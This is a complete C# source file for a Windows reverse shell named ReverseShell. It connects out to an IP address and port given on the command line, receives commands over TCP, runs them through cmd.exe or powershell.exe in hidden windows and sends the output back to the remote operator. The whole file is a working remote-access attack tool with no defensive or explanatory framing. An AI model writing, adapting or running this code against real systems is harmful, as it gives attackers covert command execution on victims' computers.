using System;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;

namespace ReverseShell
{
    class Program
    {
        //https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=netframework-4.8
        static void Main(string[] args)
        {
            // Check arguments
            if (args.Length < 3)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }

            string IpAddress = args[0];
            Int32 Port = int.Parse(args[1]);
            string CommandType = args[2];
            String CommandPrompt = String.Empty;
            String Command;

            // Windows command prompt reverse shell
            if (CommandType == "cmd.exe")
            {
                try
                {
                    // Establish TCP client
                    TcpClient client = new TcpClient(IpAddress, Port);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[+] Connected to {0} on port {1}", IpAddress, Port);
                    Console.ForegroundColor = ConsoleColor.White;

                    while (true)
                    {

                        // Implement the underlying stream of data for network access.
                        NetworkStream stream = client.GetStream();

                        // Create sending buffer
                        CommandPrompt = "CMD>";
                        byte[] SendCommandBuffer = Encoding.Default.GetBytes(CommandPrompt);
                        stream.Write(SendCommandBuffer, 0, SendCommandBuffer.Length);

                        // Create receiving buffer 
                        byte[] ReceiveCommandBuffer = new byte[1024];
                        int ResponseData = stream.Read(ReceiveCommandBuffer, 0, ReceiveCommandBuffer.Length);

                        // Resize ReceiveCommandBuffer byte array based on ResponseData size
                        Array.Resize(ref ReceiveCommandBuffer, ResponseData);

                        // Store received commands in String variable
                        Command = Encoding.Default.GetString(ReceiveCommandBuffer);

                        // List of possible exit shell commands
                        if (Command == "exit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        if (Command == "quit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        // Setup command execution
                        Process p = new Process();
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.Arguments = "/C " + Command;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.UseShellExecute = false;
                        p.Start();

                        // Store stdout and stderr output in String variable
                        String Output = p.StandardOutput.ReadToEnd();
                        String Error = p.StandardError.ReadToEnd();

                        byte[] OutputBuffer = Encoding.Default.GetBytes(Output);
                        byte[] ErrorBuffer = Encoding.Default.GetBytes(Error);

                        stream.Write(OutputBuffer, 0, OutputBuffer.Length);
                        stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);

                    }
                }
                catch (ArgumentNullException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (SocketException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (System.IO.IOException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
            }

            // MS powershell.exe reverse shell
            else if (CommandType == "powershell.exe")
            {
                try
                {
                    // Establish TCP client
                    TcpClient client = new TcpClient(IpAddress, Port);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[+] Connected to {0} on port {1}", IpAddress, Port);
                    Console.ForegroundColor = ConsoleColor.White;

                    while (true)
                    {

                        // Implement the underlying stream of data for network access.
                        NetworkStream stream = client.GetStream();

                        // Create sending buffer
                        CommandPrompt = "PS>";
                        byte[] SendCommandBuffer = Encoding.Default.GetBytes(CommandPrompt);
                        stream.Write(SendCommandBuffer, 0, SendCommandBuffer.Length);

                        // Create receiving buffer 
                        byte[] ReceiveCommandBuffer = new byte[1024];
                        int ResponseData = stream.Read(ReceiveCommandBuffer, 0, ReceiveCommandBuffer.Length);

                        // Resize ReceiveCommandBuffer byte array based on ResponseData size
                        Array.Resize(ref ReceiveCommandBuffer, ResponseData);

                        // Store received commands in String variable
                        Command = Encoding.Default.GetString(ReceiveCommandBuffer);

                        // List of possible exit shell commands
                        if (Command == "exit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        if (Command == "quit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        // Setup command execution
                        Process p = new Process();
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.FileName = "powershell.exe";
                        p.StartInfo.Arguments = "-Command " + Command;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.UseShellExecute = false;
                        p.Start();

                        // Store stdout and stderr output in String variable
                        String Output = p.StandardOutput.ReadToEnd();
                        String Error = p.StandardError.ReadToEnd();

                        byte[] OutputBuffer = Encoding.Default.GetBytes(Output);
                        byte[] ErrorBuffer = Encoding.Default.GetBytes(Error);

                        stream.Write(OutputBuffer, 0, OutputBuffer.Length);
                        stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);

                    }
                }
                catch (ArgumentNullException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (SocketException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (System.IO.IOException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Usage: ReverseShell.exe <ip address> <port> <cmd.exe or powershell.exe>");
                Console.ForegroundColor = ConsoleColor.White;
                System.Environment.Exit(1);
            }

        }
    }
}
